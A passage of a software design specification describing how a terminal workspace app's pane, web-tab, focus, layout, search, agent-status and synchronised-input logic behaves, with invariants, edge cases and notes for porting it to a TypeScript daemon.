**openWebPane(paneID, tabID, url, reusePaneID?: string, isPrivate = false, sourcePaneID?: string, direction = "horizontal")**

`paneID` and `tabID` are PRE-ALLOCATED by the caller (CLI reply echoes the pane id
before the effect runs; GUI callers mint them too).

```
normalized = normalizeURLInput(url)      // see below
pane = { id: paneID, type: "web", title: "Web", workingDirectory: home,
         createdAt/lastActivityAt: now }
webPanes[paneID] = { tabs: [{ id: tabID, url: normalized, title: "" }],
                     activeTabID: tabID, isPrivate }

reuse branch (reusePaneID names a visible pane): identical park-the-source flow as
  openMarkdownFile (clear search on source, restoreZoomIfNeeded, set
  parkedSourcePaneID, replace in layout, move source to parkedPanes, focus new,
  currentLayoutIndex = null). No effects.

split branch:
  sourceID = sourcePaneID ?? focusedPaneID     // sourcePaneID: header "+" button /
                                               // context menu chooses the split anchor
  if (sourceID != null): restoreZoomIfNeeded();
      layout = splitting(layout, sourceID, direction, paneID)
  else: layout = leaf(paneID)
panes.push(pane); setFocus(paneID); currentLayoutIndex = null
// no surface spawn (web panes have no PTY), no git-branch effect
```

`normalizeURLInput(raw)` (shared with navigate/tab-open):

```
t = raw.trim(); if t === "" return t
if t contains "://" return t
// opaque schemes without "://" (data:, javascript:, mailto:, about:, file:, tel:):
// if t starts with a letter and has a ":" whose scheme part is all
// [letter digit + - .] and the char AFTER the colon is NOT a digit
// (digits mean host:port), return t unchanged
host = t up to first "/" then up to first ":"
scheme = isLocalOrInternalHost(host) ? "http" : "https"
return `${scheme}://${t}`

isLocalOrInternalHost(h): h.lower() is "localhost" | "127.0.0.1" | "0.0.0.0" | "::1",
  or ends with ".local" / ".localhost", or contains no "." (single-label -> internal).
```

**webPaneNavigate(paneID, url)**
- Guard `webPanes[paneID]` exists AND it has a resolved active tab, else no-op.
- Normalize the URL; optimistically write it into the active tab's `url` in state (so a
  persistence save right now captures the intent before the web view reports back).
- Effect: tell the web-view coordinator (created on demand, honoring `isPrivate`) to
  load the URL in that tab.

**webPaneBack(paneID) / webPaneForward(paneID) / webPaneReload(paneID, hard = false)**
- Guard sidecar + active tab; effect only: coordinator goBack / goForward /
  reload(hard). `hard` = reload from origin (bypass cache). No state change.

**webPaneZoom(paneID, delta: number | null)**
- Guard sidecar + active tab; effect: adjust the active tab's page zoom by `delta`;
  `null` resets zoom to 1.0. No state change.

**webPaneStateChanged(paneID, tabID, url, title)** (observed navigation feedback)
- Guard sidecar exists and contains `tabID`, else no-op.
- Placeholder rule: if `url` is empty or `"about:blank"` (which appears early in loads
  and on reverts after failed navigations), KEEP the stored URL; otherwise take the
  reported one.
- If neither url nor title actually changed: no-op.
- Write url/title into the tab.
- Header echo: if `title` is non-empty AND `tabID` is the RESOLVED active tab's id
  (activeTab falls back to tabs[0] when activeTabID is stale, so compare against the
  resolved one) AND the pane's title differs, set the pane title.

**webPaneTabOpen(paneID, tabID, url, makeActive = true)**
- Guard sidecar exists; guard `tabID` NOT already present (caller must mint fresh ids).
- Append `{ id: tabID, url: normalizeURLInput(url), title: "" }`.
- If `makeActive`: `activeTabID = tabID`; syncWebPaneHeader(paneID).

**webPaneTabClose(paneID, tabID)**
- Guard sidecar exists.
- If `tabs.length <= 1`: re-dispatch **closePane(paneID)** instead (single-tab close IS
  pane close, so the full close flow runs: focus history, layout removal, snapshot,
  coordinator teardown). Return.
- Guard the tab exists. `wasActive = (activeTabID === tabID)`. Remove the tab at its
  index `idx`.
- If wasActive: `activeTabID = tabs[max(idx - 1, 0)].id` (prefer the left neighbor;
  the new first tab when the closed tab was first); syncWebPaneHeader.
- Effect: destroy the closed tab's web view.
- If wasActive AND the find bar is open on this pane (`searchingPaneID === paneID`) AND
  a new active tab exists: additionally re-run the current needle on the new active tab
  (find state is per-tab; the bar is per-pane).

**webPaneTabSelect(paneID, tabID)**
- Guards: sidecar exists; contains tabID; `activeTabID !== tabID` (else no-op).
- `activeTabID = tabID`; syncWebPaneHeader.
- If the find bar is open on this pane: effect to close find on the outgoing tab and
  run the needle on the incoming tab ("retarget find"). Only the active tab ever holds
  live find marks; this keeps `searchClose` (which targets the active tab) a complete
  teardown and prevents background tabs from resurrecting marks.

**webPaneTabCycle(paneID, offset)** (`+1` next, `-1` previous, wraps)
- Guard sidecar exists and `tabs.length > 1`.
- `activeID = activeTabID ?? tabs[0].id`; guard it resolves to an index.
- `nextIdx = ((currentIdx + offset) % n + n) % n`; set active; syncWebPaneHeader;
  retarget find as in select.

**webPaneTabReorder(paneID, orderedTabIDs)**
- Guard sidecar exists; no-op when the order is unchanged.
- Guard `orderedTabIDs` is an EXACT permutation of the current tab ids (same set, same
  count); otherwise drop the action entirely (never truncate or drop tabs).
- Reorder `tabs` to match.

**Console buffer** (per pane, ring buffer capacity 1000, oldest dropped, drops counted):
- `webConsoleLineReceived(paneID, line)`: guard sidecar; append to the ring buffer;
  then dispatch `webConsoleLineAppended(paneID)`.
- `webConsoleLineAppended(paneID)`: no-op AT THIS LEVEL. It exists purely as an
  ordering hook: the PARENT reducer reacts to it (not to `...Received`) to fan the new
  line out to streaming console subscribers, because the parent's handler for
  `...Received` would otherwise run before this reducer's append. In the TS port, if
  the daemon appends and fans out in one place, this two-step can collapse; keep the
  guarantee "subscribers see the line only after it is in the buffer".
- `webConsoleClear(paneID)`: guard sidecar; clear the buffer (the line sequence number
  keeps counting; used by `kelpi web console --clear`).
- `webConsoleAcknowledgeDrops(paneID)`: guard sidecar; reset the buffer's
  dropped-since-last-drain counter to 0 (dispatched right after a `kelpi web console`
  reply so drop counts are reported once).

**Element inspector (single-shot picker)**:
- `webInspectArmedFor(paneID, sendTo: string | null, nonce)`: guard sidecar; set
  `inspectorArmed = true`, `pendingInspectSendTo = sendTo`,
  `pendingInspectNonce = nonce`. (The page-side listener was already armed by the
  coordinator; this records the routing side. The nonce is checked against every
  delivered payload; mismatch means a page script tried to spoof the channel.)
- `webInspectDisarm(paneID)`: guard sidecar; clear all three fields. Called on
  delivered click (auto-disarm), tab close, or destination-gone.
- `webInspectResultReceived(paneID, result)`: guard sidecar; append to
  `inspectResultQueue`; cap 32 entries, dropping the OLDEST overflow.
- `webInspectResultClear(paneID)`: guard sidecar; empty the queue.

**Batch annotate**:
- `webBatchInspectBegin(paneID)`: guard sidecar; `batchInspect = { items: [],
  focusedItemID: null, panelVisible: true }`. (The parent arms the picker sticky.)
- `webBatchItemAdded(paneID, item)`: guard sidecar AND an active batch; append.
- `webBatchItemCommentChanged(paneID, itemID, comment)`: guard sidecar, active batch,
  item present; set the item's comment.
- `webBatchItemRemoved(paneID, itemID)`: guard sidecar + active batch; remove matches.
- `webBatchInspectCleared(paneID)`: guard sidecar; `batchInspect = null` (abort without
  sending; the parent also disarms the sticky picker).
- `webBatchPanelVisible(paneID, visible)`: guard sidecar, active batch, AND the flag
  actually changes; set it. Items persist across hide/show; the parent pairs this with
  picker arm/disarm and on-page marker show/hide.
- `webBatchItemFocused(paneID, itemID: string | null)`: guard sidecar + active batch;
  set `focusedItemID` (null clears). Drives bidirectional row<->page highlight.

**webPaneSetIsPrivate(paneID, enabled)**
- Guard sidecar exists AND the flag changes; set `isPrivate`. Pure state mutation; the
  parent destroys the pane's web-view coordinator alongside so tabs rebuild against the
  new (private vs persistent) data store.

### 7.7 Closing panes

**closePane(paneID)**

```
clearSearchIfTargets(paneID)
restoreZoomIfNeeded()

// A) UNPARK branch: this pane replaced a parked terminal (`kelpi open --here`).
if (closing = visible pane with paneID) AND (closing.parkedSourcePaneID != null)
   AND (parked = parkedPanes[closing.parkedSourcePaneID]) exists:
  markdownHasSurface = closing.type === "markdown" AND closing.externalEditorCommand != null
  remove parked from parkedPanes
  remove closing from panes
  panes.push(parked)                                   // the terminal returns
  layout = replacing(layout, paneID, leaf(parked.id))  // swap back in place
  focusHistory = focusHistory without paneID and without parked.id  // defensive scrub
  focusedPaneID = parked.id       // DIRECT assignment, no history push
  currentLayoutIndex = null
  if (markdownHasSurface) effect: destroySurface(paneID)  // the $EDITOR PTY it hosted
  return

// B) NORMAL close
paneType = visible pane's type, defaulting to "shell" when the pane is unknown
hasBackingSurface = paneType === "shell" OR (pane?.isUsingExternalEditor ?? false)
isWebPane = paneType === "web"

if (pane = visible pane with paneID):        // snapshot for reopen
  snapshotWebState = (pane.type === "web" AND webPanes[paneID] exists
                      AND NOT webPanes[paneID].isPrivate) ? webPanes[paneID] : null
  recentlyClosedPanes.push({ workingDirectory, label, type, filePath,
      scratchpadContent, agentSessionID, agentKind, markdownFontSize,
      webState: snapshotWebState })
  if (recentlyClosedPanes.length > 10) drop the OLDEST (front)

if (isWebPane) delete webPanes[paneID]
remove pane from panes
layout = removing(layout, paneID)
currentLayoutIndex = null
focusHistory = focusHistory without paneID   // scrub even when it wasn't focused

if (focusedPaneID === paneID):
  focusedPaneID = popFocusFromHistory(excluding: paneID)  // previously-focused pane
                  ?? allPaneIDs(layout)[0]                // fallback: layout order
                  ?? null                                 // last pane closed
  // DIRECT assignment; the closing pane never enters its own history.

effects:
  if (hasBackingSurface) destroySurface(paneID)   // kills the PTY / editor process
  if (isWebPane) destroy the pane's web-view coordinator
  // both can apply in principle (defensive); today web panes never have a surface
```

Notes:
- Closing the LAST pane leaves the workspace with `panes = []`, `layout = empty`,
  `focusedPaneID = null`. The reducer permits this; the app-level ⌘W handler maps
  "close last pane" to workspace deletion (with the active-agents confirm gate). The
  workspace-delete CLI/GUI guard uses `activeAgentCount` (1.10).
- Closing an id that names NO visible pane still resets `currentLayoutIndex`, scrubs
  history, runs the (no-op) layout removal, and fires a destroySurface effect (type
  defaults to shell); all harmless.
- Private web panes snapshot with `webState: null`, so reopen does NOT restore their
  tabs (see 7.9 for the resulting edge).

**paneProcessTerminated(paneID)** (the pane's child process exited)

Three branches, checked in order:

```
1. Parked pane died (SIGHUP etc.):
   if parkedPanes contains paneID:
     remove it from parkedPanes
     for every VISIBLE pane p with p.parkedSourcePaneID === paneID:
       p.parkedSourcePaneID = null          // its close will now be a normal close
     effect: destroySurface(paneID)
     return

2. Markdown external editor exited:
   if visible pane exists, type === "markdown", externalEditorCommand != null:
     pane.isEditing = false; pane.externalEditorCommand = null   // back to preview;
     effect: destroySurface(paneID)          // the file watcher picks up saved changes
     return

3. Otherwise (a shell exited): dispatch closePane(paneID).
```

### 7.8 Focus

**focusPane(paneID)** - `setFocus(paneID)` (3.5; pushes the previous focus onto
history). No existence check: focusing an unknown id sets it verbatim (callers pass
real ids).

**focusNextPane / focusPreviousPane**
- Guard `focusedPaneID != null` AND the layout yields a next/previous id (needs the
  current id present and >= 2 panes), else no-op.
- Target = allPaneIDs order, +1 / -1 with wraparound. `setFocus(target)`.

`clearPaneStatus` interaction: the view layer starts a 600ms timer when a
`waitingForInput` pane gains focus and then dispatches `clearPaneStatus` (7.10), so
merely looking at a waiting pane acknowledges it.

### 7.9 Reopen closed pane

**reopenClosedPane** (⌘⇧T-style)

```
snapshot = recentlyClosedPanes.pop()          // LIFO; guard non-empty else no-op
guard focusedPaneID != null else no-op
// EDGE: the snapshot is popped BEFORE the focus guard, so with no focused pane the
// snapshot is consumed and permanently lost. Faithful to current behavior.

id = newUUID()
pane = { id, label: snapshot.label, type: snapshot.type,
         workingDirectory: snapshot.workingDirectory, filePath: snapshot.filePath,
         isEditing: snapshot.type === "scratchpad",       // scratchpads reopen editing
         scratchpadContent: snapshot.scratchpadContent,
         agentKind: snapshot.agentKind,                   // display continuity
         markdownFontSize: snapshot.markdownFontSize }
// note: agentSessionID is NOT restored onto the pane; title/gitBranch/status reset.

layout = splitting(layout, focusedPaneID, "horizontal", id)
panes.push(pane)
if (snapshot.type === "web" AND snapshot.webState != null):
  webPanes[id] = snapshot.webState
  // EDGE: a private web pane closed earlier has webState null, so the reopened pane
  // gets NO sidecar entry: a web pane with no tabs. The UI must tolerate a missing
  // sidecar (treat as a blank tab); the port should normalize this (see Port notes).
setFocus(id); currentLayoutIndex = null

if (snapshot.type is markdown | scratchpad | diff | web): no effects; done.

// shell: respawn and optionally resume the agent
effect:
  env = resolveProfileEnv(profileName ?? "default")   // resume inherits the profile,
                                                       // so the agent stays on the
                                                       // workspace's account
  spawnSurface(id, pane.workingDirectory, opacity, env)
  cmd = snapshot.agentSessionID != null
        ? resumeCommand(snapshot.agentKind ?? "claude", snapshot.agentSessionID)
        : null
  if (cmd != null):            // null = unsafe session id; skip resume silently
    sleep 2 seconds            // let the shell finish starting
    typeIntoPane(id, cmd); pressEnter(id)   // sendCommand = text + Enter keystroke
```

(The parallel "restart-restore" flow that resumes agents after an APP restart lives in
the app-level reducer: it captures resume tuples from persisted panes at state load,
clears `agentSessionID`s, and types the same `resumeCommand` into respawned panes. This
workspace reducer contributes `sessionEnded`'s clearing, which is what prevents an
already-exited session from being resumed, and `agentKind`, which picks the command.)

### 7.10 Agent lifecycle and status

All of these use `mutatePane` (3.6): they apply to VISIBLE OR PARKED panes, and no-op
for unknown ids.

Status state machine:

```
                 agentStarted            agentStopped(bg=0)
        idle ------------------> running -------------------> waitingForInput
         ^                        ^   |                            |    ^
         |     clearPaneStatus    |   | agentStopped(bg>0)         |    | agentError
         +------------------------+   +--(stays running)----------+    | (from any)
              (only from waiting)     agentStarted (re-entry, no timer reset)
setPaneStatus(any) = manual override, shell panes only
```

**agentStarted(paneID, agent = "claude")**
(fired by the `start` lifecycle event: Claude `UserPromptSubmit` hook, etc.)
- If `status !== "running"`: `agentStartedAt = now` (fresh run starts the elapsed
  clock; repeated starts within one run do NOT reset it).
- `status = "running"`.
- `agentKind = agent`.
- `backgroundTaskCount = 0` (a fresh turn supersedes any background snapshot).

**agentStopped(paneID, backgroundTaskCount)**
(fired by the `stop` lifecycle event; the CLI forwards the hook payload's live
`background_tasks` count, 0 when absent/malformed)
- `backgroundTaskCount = backgroundTaskCount`.
- If count > 0: the turn ended but background shells/subagents are still in flight;
  KEEP `status = "running"` (force it, so repeat Stops as each background unit finishes
  are idempotent no-ops); if somehow not already running, set `agentStartedAt = now`.
  (The parent reducer separately suppresses the "waiting for input" notification and
  dock bounce for this pane when the count is > 0.)
- Else (count == 0): `status = "waitingForInput"`.

Self-recovery: when background work finishes it re-invokes the agent, producing
`agentStarted` (resets count to 0), and the eventual final Stop arrives with count 0.

**agentError(paneID)**
- `status = "waitingForInput"` (an errored agent needs attention, same visual state as
  awaiting input; NOT idle).
- `backgroundTaskCount = 0`.

**setPaneStatus(paneID, status)** (manual override from the pane context menu)
- Guard the pane (visible OR parked) exists AND `type === "shell"` (status is a
  shell-only concept; defense in depth, the menu is already shell-only).
- If `status === "running"` and the pane was not running: `agentStartedAt = now`.
- `status = status`.
- `backgroundTaskCount = 0` (a manual override takes control; a stale "N running"
  badge must not linger).

**sessionStarted(paneID, sessionID, agent = "claude")**
(fired by the `session-start` event, i.e. the SessionStart hook; also dual-fired by
other hooks that carry a session_id)
- `agentSessionID = sessionID`.
- `agentKind = agent`. (This is why untagged dual-fires from codex would flip the kind
  back to claude; the CLI tags every fire.)
- `backgroundTaskCount = 0` (a brand-new session inherits no background work; also
  bounds a stuck "running" if the final empty Stop was lost while the app was down).
- Does NOT touch `status` or `agentStartedAt` (status rides `agentStarted`).

**sessionEnded(paneID, sessionID)** (SessionEnd hook; issue #178)
- If `agentSessionID === sessionID`: set it to null. Otherwise leave it alone.
- The match guard matters: `/clear` and compaction fire SessionEnd(oldID) alongside
  SessionStart(newID) and the two can arrive in EITHER order; the guard keeps the live
  session tracked regardless. Clearing prevents an exited session from being
  `--resume`d on next launch or reopen.
- Codex has no SessionEnd event, so a stale codex session id can outlive the process
  (documented limitation).

**clearPaneStatus(paneID)**
- Only if the pane's current status is `"waitingForInput"`: set `"idle"`.
- Never clobbers `"running"` (the agent may have started again before the view layer's
  600ms focus-dwell timer fired this action).

### 7.11 Working directory, title, branch tracking

**paneTitleChanged(paneID, title)** (terminal reported a title change)
- mutatePane: `title = title; lastActivityAt = now`.

**paneDirectoryChanged(paneID, directory)** (terminal reported a pwd change, OSC 7)
- mutatePane: `workingDirectory = directory; lastActivityAt = now`.
- Effect: `branch = gitCurrentBranch(directory) catch null;`
  dispatch `paneBranchChanged(paneID, branch)`.

**paneBranchChanged(paneID, branch: string | null)**
- mutatePane: `gitBranch = branch`. (Null clears the badge, e.g. cwd left the repo or
  git errored.)

Branch detection therefore happens: at markdown-pane open (parent dir), at diff-pane
open (repo path), and on every cwd change of any pane. It is best-effort; failures
resolve to null, never to an error.

### 7.12 Layout actions

**updateSplitRatio(splitPath, ratio)** (GUI divider drag; also the backing semantics of
`kelpi pane resize`)
- `layout = updatingSplitRatio(layout, splitPath, ratio)` (1.7; clamp 0.1..0.9; bad
  paths leave the layout unchanged).
- `currentLayoutIndex = null`.

**movePane(paneID, targetPaneID, zone)** (GUI drag-drop; CLI `pane move --target X
--above/--below/--left-of/--right-of Y` maps its edge flags to zones
above->top, below->bottom, left-of->left, right-of->right)
- Guard BOTH ids name visible panes, else no-op.
- `layout = movingPane(layout, paneID, targetPaneID, zone)` (1.6).
- `setFocus(paneID)`; `currentLayoutIndex = null`.
- Edge: `paneID === targetPaneID` passes the guards; the layout is unchanged (movingPane
  no-ops) but focus is still set and the layout index still resets.

**movePaneInDirection(direction)** (keyboard "move pane left/right/up/down"; the CLI's
fire-and-forget directional `kelpi pane move <dir>` for the calling pane)
- Guard `zoomedPaneID === null` (moving while zoomed is a no-op, NOT an un-zoom).
- Guard `focusedPaneID != null`.
- `neighbor = neighborPaneID(layout, focusedPaneID, direction)` (geometric, 1.6);
  guard non-null.
- `layout = swappingLeaves(layout, focusedPaneID, neighbor)`: the two panes exchange
  positions; every split direction and ratio is preserved; focus stays on the same pane
  id (now in the neighbor's slot).
- `currentLayoutIndex = null`.

**cycleLayout** (⌘⇧Space / `kelpi layout cycle`)
- Guard `panes.length > 1` else no-op.
- restoreZoomIfNeeded().
- `nextIndex = currentLayoutIndex == null ? 0 : (currentLayoutIndex + 1) % 5`.
  (A hand-modified layout restarts the cycle at even-horizontal.)
- `ids = allPaneIDs(layout)`; if the focused pane is in the list but not first, move it
  to the front (it becomes "main" in the main-* layouts; relative order of the rest is
  preserved).
- `layout = buildLayout(PREDEFINED[nextIndex], ids)`; `currentLayoutIndex = nextIndex`.

**selectLayout(predefined)** (`kelpi layout select <name>` / menu)
- Guard `panes.length > 1`; restoreZoomIfNeeded(); look up the layout's index in the
  canonical order (0..4).
- Same focused-pane-to-front reorder; build; `currentLayoutIndex = index`.

**toggleZoomPane**
- If currently zoomed (`zoomedPaneID != null`): restore `savedLayout` (if present) into
  `layout`; clear `zoomedPaneID` and `savedLayout`.
- Else, if `focusedPaneID != null` AND `panes.length > 1`: `savedLayout = layout`;
  `zoomedPaneID = focusedPaneID`; `layout = leaf(focusedPaneID)`.
- Single-pane workspaces cannot zoom. `currentLayoutIndex` is untouched in both
  directions.
- While zoomed, resize/split-type actions either restore first (5.1) or no-op
  (movePaneInDirection); `updateSplitRatio` on the zoomed leaf layout is a structural
  no-op (no split nodes) but still clears the layout index.

### 7.13 Repo associations

**addRepoAssociation(assoc)** - append to `repoAssociations`.
**removeRepoAssociation(id)** - remove by association id.
(Population/auto-detection logic lives outside this reducer.)

### 7.14 Search / find

One find bar per workspace at a time (`searchingPaneID`). Three backends by pane type:
terminal search (shell), markdown-preview find, web-view find (per active tab).
`searchTotal` = number of matches, `searchSelected` = current match index; both start
null.

**toggleSearch** (find keybinding)
- Guard: there is a focused pane AND its type is `"shell"`, `"web"`, or
  (`"markdown"` AND not editing). Scratchpad/diff and editing markdown panes cannot
  host find.
- If a search is ALREADY open anywhere in the workspace: dispatch `searchClose`
  (i.e. the toggle closes the existing bar, even if focus moved to a different pane;
  it does not move the bar).
- Else: `searchingPaneID = focusedPaneID; searchNeedle = ""; searchTotal = null;
  searchSelected = null`.

**ghosttySearchStarted(paneID, needle)** (the terminal itself initiated a search, e.g.
a native ghostty keybinding)
- Guard the visible pane exists and is `"shell"`.
- Adopt it: `searchingPaneID = paneID; searchNeedle = needle; searchTotal = null;
  searchSelected = null`. (Replaces any bar open on another pane.)

**ghosttySearchEnded(paneID)**
- Guard `searchingPaneID === paneID`; clear all four search fields.

**searchNeedleChanged(needle)**
- `searchNeedle = needle; searchSelected = null`.
- Guard a search is open; route by the searched pane's type:
  - web: effect drives find on the ACTIVE TAB with the needle. Latest-wins
    cancellation (an in-flight previous run is cancelled), no artificial delay.
  - markdown: effect updates the markdown find controller. Latest-wins, no delay.
  - shell: needle == "" -> immediately clear the terminal search
    (`search:` with empty payload); needle length < 3 -> wait 300ms then run
    `search:<needle>` (debounce, cancelled by the next change); length >= 3 -> run
    immediately (still cancels any in-flight predecessor). All three share one
    cancellation key.

**searchNavigateNext / searchNavigatePrevious**
- Guard a search is open; route by type: web -> find-next/previous on the active tab;
  markdown -> controller next/previous; shell -> terminal `navigate_search:next` /
  `navigate_search:previous`.

**searchClose**
- Guard a search is open. Capture the pane type and (for web) the active tab id, THEN
  clear all four fields, then effect: web -> close find on that tab; markdown -> close
  the controller; shell -> terminal `end_search`.

**searchTotalUpdated(paneID, total)** (backend reported a match count)
- Guard `searchingPaneID === paneID` (stale reports from other panes are dropped).
- `searchTotal = total`; if `total === 0` also `searchSelected = null` (prevents a
  "3/0" display when a live-reloaded document loses its matches).

**searchSelectedUpdated(paneID, selected)**
- Guard `searchingPaneID === paneID`; `searchSelected = selected`.

Search cleanup is also triggered from: `closePane` (searched pane closing),
`toggleMarkdownEdit` entering edit mode, and the reuse branches of
openMarkdownFile/openDiffPane/openWebPane (source pane being parked).

### 7.15 Synchronise input (tmux-style, issue #121)

**toggleSyncInput**
- `isSyncInputActive = !isSyncInputActive`.
- `syncInputExcluded = {}` on EVERY transition (both off->on and on->off). Clearing
  only on off would let an exclude staged while sync was off silently survive into the
  next on-cycle; each on-cycle must start from the "all shell panes participate"
  baseline. Consequence: `kelpi pane sync exclude` is only meaningful AFTER `sync on`.
- Effect: refreshSyncGroup (3.8).

**setSyncInputActive(active)** (idempotent CLI form: `sync on` / `sync off`)
- Guard `isSyncInputActive !== active` else no-op (repeated `sync on` does NOT clear
  exclusions).
- Set; clear `syncInputExcluded`; refreshSyncGroup.

**setSyncInputExcluded(paneID, excluded)**
- Guard the pane is VISIBLE (parked panes are not eligible anyway; unknown ids no-op).
- Insert into / remove from `syncInputExcluded`; refreshSyncGroup.
- Note: legal while sync is off (the set mutates) but pointless, since the next
  activation clears it.

**Automatic group refresh** (a second reducer pass that runs AFTER the main handler,
observing the post-mutation state):

```
if (state.isSyncInputActive) AND action is one of
   { createPane, splitPane, splitPaneAtPath, closePane,
     openMarkdownFile, openDiffPane, openWebPane,
     createScratchpad, reopenClosedPane, paneProcessTerminated }:
  emit refreshSyncGroup(state)
```

So while sync is active, brand-new shell panes JOIN the group automatically and closed
panes drop out, without every call site remembering. When sync is off no refresh is
needed (the group entry is already absent; the explicit sync actions handle their own
refresh synchronously). The group can collapse to empty via the ">= 2 shell panes"
rule (e.g. closing the second-to-last shell pane), in which case refresh REMOVES the
broadcaster entry even though `isSyncInputActive` stays true; opening another shell
pane re-materializes the group.

Sync flag lifecycle: `isSyncInputActive` and `syncInputExcluded` are transient and
reset to off/empty on app restart.

---

## 8. Invariants

1. Every VISIBLE pane id appears exactly once as a leaf in `layout`, and every leaf id
   names a visible pane. (`createPane` misuse and a stale `focusedPaneID` during
   `splitPaneAtPath` are the two known ways to break this; keep the caller contracts.)
2. A pane lives in exactly one of `panes` / `parkedPanes` at any time.
3. `focusedPaneID` is null only when the workspace has no visible panes (or transiently
   on restore); it always names a visible pane otherwise.
4. `focusHistory` contains no duplicates, never the currently-focused pane as its last
   pushed entry twice, max 8 entries; dead ids are tolerated (lazily filtered on pop)
   but scrubbed eagerly on close/unpark.
5. `zoomedPaneID != null` iff `savedLayout != null`; while zoomed, `layout` is
   `leaf(zoomedPaneID)`. (Watch the openMarkdownFile caveat in 7.4, which can violate
   the second half until the next un-zoom.)
6. `currentLayoutIndex != null` implies the layout is exactly the predefined layout at
   that index built over the current pane order (any structural edit nulls it).
7. `webPanes` has an entry for every visible web pane EXCEPT a reopened private web
   pane (7.9 edge); it never has entries for non-web panes; entries are deleted on
   web-pane close.
8. `recentlyClosedPanes.length <= 10`; `inspectResultQueue.length <= 32`; console ring
   buffer capacity 1000; `focusHistory.length <= 8`; labels each <= 64 chars.
9. `syncInputExcluded` is always empty when `isSyncInputActive` is false... eventually:
   it is cleared on every activation transition, though it can be transiently non-empty
   while off (see 7.15).
10. `backgroundTaskCount > 0` implies `status === "running"` (enforced by agentStopped;
    agentStarted/sessionStarted/agentError/setPaneStatus all reset the count).
11. `agentStartedAt` is set on every non-running -> running transition and never reset
    mid-run.
12. Session ids only ever reach a PTY through `resumeCommand`, which enforces the
    safety allowlist. Never interpolate a raw wire string into a shell command.
13. Splits created by user actions always start at ratio 0.5 with the pre-existing pane
    first; stored ratios are always in [0.1, 0.9] after any update (initial predefined
    layouts can store smaller ratios, e.g. 1/N for N > 10 panes in an even split; the
    clamp applies only to updates).

## 9. Edge cases catalogue

- `splitPane` with a `sourcePaneID` naming a parked or unknown pane: no-op (visible
  panes only).
- `splitPaneAtPath` with stale focus: appends an orphaned pane (see 7.2 warning).
- `createPane` on a populated workspace: orphans all existing panes (caller contract).
- `closePane` of the last pane: empty workspace; app layer treats this as
  workspace-delete when triggered from the close-pane keybinding.
- `reopenClosedPane` with no focused pane: the snapshot is consumed and lost.
- Reopened private web pane: pane exists, no `webPanes` entry.
- `webPaneTabClose` on the last tab: becomes `closePane`.
- `movePane` onto itself: layout unchanged, but focus set and layout index reset.
- `movePaneInDirection` while zoomed: no-op (does not un-zoom).
- Out-of-order SessionEnd(old)/SessionStart(new): the match guard in `sessionEnded`
  keeps the new id either way.
- Repeated `agentStarted` during one run: status stays running, timer NOT reset.
- Repeated `agentStopped(bg>0)`: idempotent (stays running, count updated).
- Codex: no SessionEnd -> stale codex session id may persist after exit (restart may
  resume an old session; pane sits in the waiting bucket). Accepted limitation.
- `searchTotalUpdated`/`searchSelectedUpdated` for a pane that is not the searching
  pane: dropped.
- `webPaneStateChanged` with `about:blank`/empty URL: URL preserved, title may update.
- `webPaneTabReorder` with a non-permutation: dropped wholesale.
- `paneProcessTerminated` for a parked pane clears `parkedSourcePaneID` on any pane
  pointing at it, converting that pane's future close into a normal close.
- Unknown pane ids in mutate-style actions (`paneTitleChanged`, `agentStarted`, ...):
  silent no-ops.

---

## 10. Port notes

1. **Effects model.** Every behavior above is expressed as pure state transitions plus
   a list of effects. The TS daemon should keep that shape: a workspace reducer
   returning `{ state, effects }` where effects are: `spawnPty(paneID, cwd, env,
   command?)`, `destroyPty(paneID)`, `gitBranch(dir) -> dispatch paneBranchChanged`,
   `setSyncGroup(wsID, ids)`, web-view commands, `typeIntoPane + Enter` (resume), and
   timed follow-ups (2s resume delay, 300ms search debounce, the view-layer 600ms
   clearPaneStatus dwell). Ghostty surface lifetime maps to daemon-owned PTY +
   ghostty-vt terminal state; "destroySurface" = kill PTY + drop terminal state +
   broadcast pane-removed to clients.

2. **Who renders vs who owns.** In the Swift app the reducer and the views live in one
   process. In the port, this whole state machine belongs in the DAEMON (it must behave
   identically for CLI-only usage with no client attached). Client-side things to
   re-home: the 600ms focus-dwell timer that fires `clearPaneStatus` (either daemon-side
   on focus events from clients, or client-sent), the markdown find controller and
   web-view find (move to the web client; the daemon keeps only
   searchingPaneID/needle/total/selected and relays), drag-drop DropZone hit-testing
   (`DropZone.calculate` = nearest-edge quadrant test; keep it client-side, send
   `movePane` with the resolved zone).

3. **The external-$EDITOR markdown mode is macOS-app-specific.** It spawns a PTY
   running `$EDITOR file` inside the markdown pane. The port CAN reproduce it (the
   daemon owns PTYs and the web client renders terminals anyway); if it does, keep the
   exact rules: surface exists only while `externalEditorCommand != null`, editor exit
   returns to preview (paneProcessTerminated branch 2), close while editing destroys
   the surface, and such panes are still excluded from sync groups.

4. **Sequencing subtleties safe to simplify:**
   - `webConsoleLineReceived` -> `webConsoleLineAppended` exists only to order the
     parent's fan-out after the append; a single-owner daemon can append and fan out in
     one step, preserving "subscribers see a line only after it is buffered".
   - The `newPaneID`/`tabID` pre-allocation exists so CLI replies can echo real ids.
     Keep it: the wire handler mints the UUID, replies, then dispatches with the id.

5. **Bugs/quirks preserved in this spec that the port may deliberately fix** (flag in
   code if you do): openMarkdownFile's missing un-zoom restore in the split branch
   (7.4); reopenClosedPane consuming the snapshot before the focus guard (7.9);
   reopened private web panes lacking a sidecar (normalize to a blank tab);
   `createPane`'s unconditional layout replacement (add an "only when empty" guard);
   `movePane` self-target still resetting `currentLayoutIndex` and focus.

6. **Persistence boundary.** Serialize exactly the fields listed in 1.9's persisted
   set; everything marked TRANSIENT must reset on daemon restart. The app-level restore
   flow (not this reducer) captures (paneID, agentSessionID, agentKind, cwd) resume
   tuples BEFORE clearing session ids, then respawns and types resume commands; keep
   `sessionEnded`'s match-guarded clearing and `agentKind`'s survival, or resume will
   either re-attach dead sessions or run the wrong CLI.

7. **Concurrency.** The Swift version relies on TCA's serialized action processing:
   all transitions above are atomic with respect to each other. The daemon must
   serialize actions per workspace (a single event loop or per-workspace queue). Git
   branch lookups and PTY spawns are async and re-enter via dispatched actions; they
   must tolerate the pane having been closed meanwhile (all the mutate actions already
   no-op on unknown ids, keep that).

8. **Sync input over the wire.** The broadcaster (section 4) currently mirrors
   libghostty key events object-for-object. In the port, mirroring happens where input
   enters: the daemon receives key/text input per pane from clients and, when the
   source pane is in its workspace's sync group, writes the same bytes/key events to
   every sibling PTY. Keep the rules: source excluded, shell panes only (enforced by
   the membership computation, not the broadcaster), best-effort on dead PTYs, group
   membership pushed eagerly by refreshSyncGroup rather than computed per keystroke.

